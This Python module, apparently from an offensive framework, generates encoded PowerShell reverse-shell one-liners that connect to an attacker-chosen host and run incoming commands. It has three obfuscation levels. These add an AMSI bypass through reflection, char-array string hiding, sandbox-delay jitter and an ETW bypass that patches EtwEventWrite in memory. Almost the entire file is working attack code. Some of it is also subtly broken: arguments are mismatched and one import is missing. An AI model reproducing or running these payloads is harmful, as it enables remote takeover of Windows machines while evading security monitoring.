# payload_generator/windows/tcp/powershell_reverse_tcp.py

import base64
from core.payload_generator.common import payload_utils as payutils
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"

def make_raw(ip: str, port: int, use_ssl: bool) -> str:
    """
    Returns the raw PowerShell one-liner (no encoding) for a Windows
    reverse TCP shell, either plain or over SSL.
    """
    if use_ssl:
        payload = (
            f"$h='{ip}';$p={port};"
            "$c=New-Object System.Net.Sockets.TCPClient;"
            "$c.Connect($h,$p);"
            "$ssl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,({$true}));"
            "$ssl.AuthenticateAsClient($h);"
            "$sr=New-Object System.IO.StreamReader($ssl,[System.Text.Encoding]::UTF8);"
            "$sw=New-Object System.IO.StreamWriter($ssl,[System.Text.Encoding]::UTF8);"
            "$sw.AutoFlush=$true;"
            "while(($cmd=$sr.ReadLine())){"
              "if(!$cmd){continue};"
              "try{$o=Invoke-Expression $cmd|Out-String}catch{$o=$_.Exception.Message};"
              "$o=$o -replace '^\\s+|\\s+$','';"
              "$sw.WriteLine($o)"
            "};"
            "$ssl.Close();$c.Close();"
        )
    else:
        payload = (
            f"$h='{ip}';$p={port};"
            "$c=New-Object System.Net.Sockets.TCPClient;"
            "$c.Connect($h,$p);"
            "$ns=$c.GetStream();"
            "$sr=New-Object System.IO.StreamReader($ns,[System.Text.Encoding]::UTF8);"
            "$sw=New-Object System.IO.StreamWriter($ns,[System.Text.Encoding]::UTF8);"
            "$sw.AutoFlush=$true;"
            "while(($cmd=$sr.ReadLine())){"
              "if(!$cmd){continue};"
              "try{$o=Invoke-Expression $cmd|Out-String}catch{$o=$_.Exception.Message};"
              "$o=$o -replace '^\\s+|\\s+$','';"
              "$sw.WriteLine($o)"
            "};"
            "$c.Close();"
        )

    return payload

def generate_powershell_reverse_tcp(ip: str, port: int, obs: int, use_ssl: bool, no_child: bool = False) -> str:
    """
    obs levels can then dispatch to your existing obfuscation helpers
    (obs==0 raw, obs==1/2/3 hand off to other functions).
    """
    raw = make_raw(ip, port, use_ssl)

    # For a non-obfuscated, straight EncodedCommand:
    if obs == 0:
        cmd = payutils.encode_win_payload(raw, no_child)
        payutils.copy_and_print(cmd)
        return cmd

    # for other obs-levels, import and call:
    if obs == 1:
        payload = generate_windows_powershell_tcp_obfuscate_level1(raw, ip, port, use_ssl)
        cmd = payutils.encode_win_payload(payload, no_child)
        payutils.copy_and_print(cmd)
        return cmd

    if obs == 2:
        payload = generate_windows_powershell_tcp_obfuscate_level2(raw, ip, port, use_ssl)
        cmd = payutils.encode_win_payload(payload, no_child)
        payutils.copy_and_print(cmd)
        return cmd

    if obs == 3:
        payload = generate_windows_powershell_tcp_obfuscate_level3(raw, ip, port, use_ssl)
        cmd = payutils.encode_win_payload(payload, no_child)
        payutils.copy_and_print(cmd)
        return cmd

    raise ValueError(f"Unsupported obs level: {obs}")


def generate_windows_powershell_tcp_obfuscate_level1(payload, ip, port, use_ssl: bool = False):
    ip_parts = ip.split('.')
    ip_literal = "+'.'+".join(f"'{part}'" for part in ip_parts)

    # 2) Port literal (could be math, but keep it simple)
    port_literal = str(port)

    # 3) Hand-crafted, static, obfuscated template:
    if use_ssl:
        one_liner = (
        f"$clf={ip_literal};"
        f"$prt={port_literal};"
        "$tcp=New-Object ('Sy'+'stem.Net.Sockets.TcpClient');"
        "$tcp.Connect($clf,$prt);"
        "$ssl=New-Object System.Net.Security.SslStream($tcp.GetStream(),$false,({$true}));"
        "$ssl.AuthenticateAsClient($clf);"
        "$sr=New-Object System.IO.StreamReader($ssl,[System.Text.Encoding]::UTF8);"
        "$sw=New-Object System.IO.StreamWriter($ssl,[System.Text.Encoding]::UTF8);"
        "$sw.AutoFlush=$true;"
        "while(($cmd0=$sr.ReadLine())){"
        "if(!$cmd0){continue};"
        "try{$out1=Invoke-Expression $cmd0|Out-Str`ing}catch{$out1=$_.Exception.Message};"
        "$out1=$out1 -replace '^\\s+|\\s+$','';"
        "$sw.WriteLine($out1)};"
        "$ssl.Close();$tcp.Close();"
        )

    elif not use_ssl:
        one_liner = (
        f"$clf={ip_literal};"
        f"$prt={port_literal};"
        "$tcp=New-Object ('Sy'+'stem.Net.Sockets.TcpClient');"
        "$tcp.Connect($clf,$prt);"
        "$ns=$tcp.GetStream();"
        "$sr=New-Object System.IO.StreamReader($ns,[System.Text.Encoding]::UTF8);"
        "$sw=New-Object System.IO.StreamWriter($ns,[System.Text.Encoding]::UTF8);"
        "$sw.AutoFlush=$true;"
        "while(($cmd0=$sr.ReadLine())){"
        "if(!$cmd0){continue};"
        "try{$out1=Invoke-Expression $cmd0|Out-Str`ing}catch{$out1=$_.Exception.Message};"
        "$out1=$out1 -replace '^\\s+|\\s+$','';"
        "$sw.WriteLine($out1)"
        "};"
        "$tcp.Close();"
            )

    else:
        print(brightred + f"[-] ERROR failed to generate payload an unknown error ocurred!")

    return one_liner

def generate_windows_powershell_tcp_obfuscate_level2(raw, ip, port, os_type, use_ssl: bool = False,):
    """
    Level 2: heavy obfuscation plus AMSI bypass via reflection.
    Embeds the provided one-liner and returns a fully EncodedCommand.
    """
    # build the "'192'+'.'+'168'+...+''" style IP literal
    ip_parts    = ip.split('.')
    ip_literal  = "+'.'+".join(f"'{part}'" for part in ip_parts)
    port_literal = str(port)

    if use_ssl:
        one_liner = (
        # AMSI bypass via reflection
        "$e=[Ref].('Assem'+'bly').GetType(([string]::Join('', [char[]]"
        "(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,"
        "111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
        "$n='Non'+'Public';"
        "$s='Static';"
        "$f=$e.GetField(([string]::Join('',[char[]]"
        "(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),($n+','+$s));"
        "$t=[type[]]@([object],[bool]);"
        "$m=$f.GetType().GetMethod('Set'+'Value',$t);"
        "$m.Invoke($f,@($null,$true));"

        # build type names
        "$A=[string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,99,112,67,108,105,101,110,116));"
        "$S=[string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,78,101,116,46,83,101,99,117,114,105,116,"
        "121,46,83,115,108,83,116,114,101,97,109));"
        "$C=[string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,82,101,"
        "97,100,101,114));"
        "$W=[string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,87,114,"
        "105,116,101,114));"

        # dynamic IP/port
        f"$ip={ip_literal};"
        f"$port={port_literal};"

        # TCP + SSL connect
        "$client=New-Object -TypeName $A;"
        "$client.Connect($ip,$port);"
        "$ssl=New-Object -TypeName $S -ArgumentList @($client.GetStream(),$false, ({$true}));"
        "$ssl.AuthenticateAsClient($ip);"
        "$reader=New-Object -TypeName $C -ArgumentList @($ssl,[System.Text.Encoding]::UTF8);"
        "$writer=New-Object -TypeName $W -ArgumentList @($ssl,[System.Text.Encoding]::UTF8);"
        "$writer.AutoFlush=$true;"

        # shell loop
        "$iex=('Invo'+'ke-Expre'+'ssion');"
        "while($cmd=$reader.ReadLine()){if(!$cmd){continue};"
        "try{$out=& $iex $cmd|Out-Str`ing}catch{$out=$_.Exception.Message};"
        "$clean=($out -replace '^\\\\s+|\\\\s+$','');"
        "$writer.WriteLine($clean)};"
        "$ssl.Close();$client.Close();"
        )

    elif not use_ssl:
        one_liner = (
        # AMSI bypass via reflection
        "$e=[Ref].('Assem'+'bly').GetType(([string]::Join('', [char[]]"
        "(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,"
        "111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
        "$n='Non'+'Public';"
        "$s='Static';"
        "$f=$e.GetField(([string]::Join('',[char[]]"
        "(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),($n+','+$s));"
        "$t=[type[]]@([object],[bool]);"
        "$m=$f.GetType().GetMethod('Set'+'Value',$t);"
        "$m.Invoke($f,@($null,$true));"

        # build type names
        "$A=[string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,99,112,67,108,105,101,110,116));"
        "$C=[string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,82,101,"
        "97,100,101,114));"
        "$W=[string]::Join('',[char[]]"
        "(83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,87,114,"
        "105,116,101,114));"

        # dynamic IP/port
        f"$ip={ip_literal};"
        f"$port={port_literal};"

        # raw TCP connect
        "$client=New-Object -TypeName $A;"
        "$client.Connect($ip,$port);"
        "$ns=$client.GetStream();"
        "$reader=New-Object -TypeName $C -ArgumentList @($ns,[System.Text.Encoding]::UTF8);"
        "$writer=New-Object -TypeName $W -ArgumentList @($ns,[System.Text.Encoding]::UTF8);"
        "$writer.AutoFlush=$true;"

        # shell loop
        "$iex=('Invo'+'ke-Expre'+'ssion');"
        "while($cmd=$reader.ReadLine()){if(!$cmd){continue};"
        "try{$out=& $iex $cmd|Out-Str`ing}catch{$out=$_.Exception.Message};"
        "$clean=($out -replace '^\\\\s+|\\\\s+$','');"
        "$writer.WriteLine($clean)};"
        "$client.Close()"
        )

    else:
        print(brightred + f"[-] ERROR failed to generate payload an unknown error ocurred!")

    return one_liner

def generate_windows_powershell_tcp_obfuscate_level3(raw, ip, port, os_type, use_ssl: bool = False):
    ip_parts = ip.split('.')
    ip_literal = "+'.'+".join(f"'{part}'" for part in ip_parts)
    port_literal = str(port)

    # Generate random variable names for some basic anti-sig obfuscation
    rnd = lambda: ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(4,8)))
    v_amsi = rnd()
    v_etw = rnd()
    v_tcp = rnd()
    v_reader = rnd()
    v_writer = rnd()
    v_ssl = rnd()
    v_cmd = rnd()
    v_out = rnd()
    v_bytes = rnd()

    if use_ssl:
        one_liner = (
            # AMSI bypass (unchanged)
            "$e=[Ref].('Assem'+'bly').GetType(([string]::Join('', [char[]]"
            "(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,"
            "111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
            "$n='Non'+'Public';"
            "$s='Static';"
            "$f=$e.GetField(([string]::Join('',[char[]]"
            "(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),($n+','+$s));"
            "$t=[type[]]@([object],[bool]);"
            "$m=$f.GetType().GetMethod('Set'+'Value',$t);"
            "$m.Invoke($f,@($null,$true));"

            # Random sleep for sandbox jitter
            "Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 2000);"

            # Build type names using char arrays
            "$A = [string]::Join('', [char[]](83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,99,112,67,108,105,101,110,116));"
            "$S = [string]::Join('', [char[]](83,121,115,116,101,109,46,78,101,116,46,83,101,99,117,114,105,116,121,46,83,115,108,83,116,114,101,97,109));"
            "$C = [string]::Join('', [char[]](83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,82,101,97,100,101,114));"
            "$W = [string]::Join('', [char[]](83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,87,114,105,116,101,114));"
            "$Q=[string]::Join('',[char[]]"
            "(83,121,115,116,101,109,46,78,101,116,46,83,101,99,117,114,105,116,"
            "121,46,83,115,108,83,116,114,101,97,109));"

            # dynamic IP/port
            f"$ip={ip_literal};"
            f"$port={port_literal};"

            # TCP + TLS connection with cert‐validation bypass & TLS1.2
            "$client = New-Object -TypeName $A;"
            "$client.Connect($ip, $port);"
            "$ssl=New-Object -TypeName $Q -ArgumentList @($client.GetStream(),$false,({$true}));"
            "$ssl.AuthenticateAsClient($ip, $null, [System.Security.Authentication.SslProtocols]::Tls12, $false);"

            # Reader/Writer
            "$reader = New-Object -TypeName $C -ArgumentList @($ssl, [System.Text.Encoding]::UTF8);"
            "$writer = New-Object -TypeName $W -ArgumentList @($ssl, [System.Text.Encoding]::UTF8);"
            "$writer.AutoFlush = $true;"

            # Shell loop with preferred execution method
            "while ($cmd = $reader.ReadLine()) {"
            "if (!$cmd) { continue };"
            "try { $out = [ScriptBlock]::Create($cmd).Invoke() | Out-String }"
            "catch { $out = $_.Exception.Message };"
            "$clean = ($out -replace '^\\s+|\\s+$','');"
            "$writer.WriteLine($clean)"
            "}"

            # Cleanup
            "$ssl.Close();"
            "$client.Close();"

            # ETW bypass dynamic offset calculation
            "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Win{"
            "[DllImport(\"kernel32.dll\")] public static extern IntPtr LoadLibrary(string s);"
            "[DllImport(\"kernel32.dll\")] public static extern IntPtr GetProcAddress(IntPtr m, string p);"
            "[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o); }';"
            "$k=([char[]](107,101,114,110,101,108,51,50,46,100,108,108)-join'');"
            "$n=([char[]](110,116,100,108,108,46,100,108,108)-join'');"
            "$v=([char[]](86,105,114,116,117,97,108,80,114,111,116,101,99,116)-join'');"
            "$e=([char[]](69,116,119,69,118,101,110,116,87,114,105,116,101)-join'');"
            "$mod=[Win]::LoadLibrary($k);$vp=[Win]::GetProcAddress($mod,$v);"
            "$ntbase=([System.Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName -eq $n}).BaseAddress;"
            "$peOff=$ntbase.ToInt64()+0x3C;"
            "$pe=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$peOff);"
            "$etblOff=$ntbase.ToInt64()+$pe+0x88;"
            "$expt=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$etblOff);"
            "$exptVA=$ntbase.ToInt64()+$expt;"
            "$fnCount=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x18));"
            "$fnNamesRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x20));"
            "$fnNamesVA=$ntbase.ToInt64()+$fnNamesRVA;"
            "$etwptr=0;for($i=0;$i-lt$fnCount;$i++){"
            "$nameRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($fnNamesVA+($i*4)));"
            "$namePtr=($ntbase.ToInt64()+$nameRVA);"
            "$currName=\"\";for($j=0;($c=[System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]($namePtr),$j))-ne 0;$j++)"
            "{$currName+=[char]$c};if($currName-eq$e){$etwptr=$namePtr;break}};"
            "$etwAddr=[IntPtr]$etwptr;"
            "$null=[Win]::VirtualProtect($etwAddr,[UIntPtr]::op_Explicit(1),0x40,[ref]([uint32]0));"
            "[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr,0xC3);"

        )

    elif not use_ssl:
        one_liner = (
            # AMSI bypass (unchanged)
            "$e=[Ref].('Assem'+'bly').GetType(([string]::Join('', [char[]]"
            "(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,"
            "111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
            "$n='Non'+'Public';"
            "$s='Static';"
            "$f=$e.GetField(([string]::Join('',[char[]]"
            "(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),($n+','+$s));"
            "$t=[type[]]@([object],[bool]);"
            "$m=$f.GetType().GetMethod('Set'+'Value',$t);"
            "$m.Invoke($f,@($null,$true));"

            # Random sleep for sandbox jitter
            "Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 2000);"

            # Build type names using char arrays
            "$A = [string]::Join('', [char[]](83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,99,112,67,108,105,101,110,116));"
            "$C = [string]::Join('', [char[]](83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,82,101,97,100,101,114));"
            "$W = [string]::Join('', [char[]](83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,87,114,105,116,101,114));"

            # dynamic IP/port
            f"$ip={ip_literal};"
            f"$port={port_literal};"

            # raw TCP connection
            "$client = New-Object -TypeName $A;"
            "$client.Connect($ip, $port);"
            "$ns = $client.GetStream();"
            "$reader = New-Object -TypeName $C -ArgumentList @($ns, [System.Text.Encoding]::UTF8);"
            "$writer = New-Object -TypeName $W -ArgumentList @($ns, [System.Text.Encoding]::UTF8);"
            "$writer.AutoFlush = $true;"

            # Shell loop with preferred execution method
            "while ($cmd = $reader.ReadLine()) {"
            "if (!$cmd) { continue };"
            "try { $out = [ScriptBlock]::Create($cmd).Invoke() | Out-String }"
            "catch { $out = $_.Exception.Message };"
            "$clean = ($out -replace '^\\s+|\\s+$','');"
            "$writer.WriteLine($clean)"
            "}"

            # Cleanup
            "$client.Close();"

            # ETW bypass dynamic offset calculation
            "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Win{"
            "[DllImport(\"kernel32.dll\")] public static extern IntPtr LoadLibrary(string s);"
            "[DllImport(\"kernel32.dll\")] public static extern IntPtr GetProcAddress(IntPtr m, string p);"
            "[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o); }';"
            "$k=([char[]](107,101,114,110,101,108,51,50,46,100,108,108)-join'');"
            "$n=([char[]](110,116,100,108,108,46,100,108,108)-join'');"
            "$v=([char[]](86,105,114,116,117,97,108,80,114,111,116,101,99,116)-join'');"
            "$e=([char[]](69,116,119,69,118,101,110,116,87,114,105,116,101)-join'');"
            "$mod=[Win]::LoadLibrary($k);$vp=[Win]::GetProcAddress($mod,$v);"
            "$ntbase=([System.Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName -eq $n}).BaseAddress;"
            "$peOff=$ntbase.ToInt64()+0x3C;"
            "$pe=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$peOff);"
            "$etblOff=$ntbase.ToInt64()+$pe+0x88;"
            "$expt=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$etblOff);"
            "$exptVA=$ntbase.ToInt64()+$expt;"
            "$fnCount=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x18));"
            "$fnNamesRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x20));"
            "$fnNamesVA=$ntbase.ToInt64()+$fnNamesRVA;"
            "$etwptr=0;for($i=0;$i-lt$fnCount;$i++){"
            "$nameRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($fnNamesVA+($i*4)));"
            "$namePtr=($ntbase.ToInt64()+$nameRVA);"
            "$currName=\"\";for($j=0;($c=[System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]($namePtr),$j))-ne 0;$j++)"
            "{$currName+=[char]$c};if($currName-eq$e){$etwptr=$namePtr;break}};"
            "$etwAddr=[IntPtr]$etwptr;"
            "$null=[Win]::VirtualProtect($etwAddr,[UIntPtr]::op_Explicit(1),0x40,[ref]([uint32]0));"
            "[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr,0xC3);"

        )

    else:
        print(brightred + f"[-] ERROR failed to generate payload an unknown error ocurred!")

    return one_liner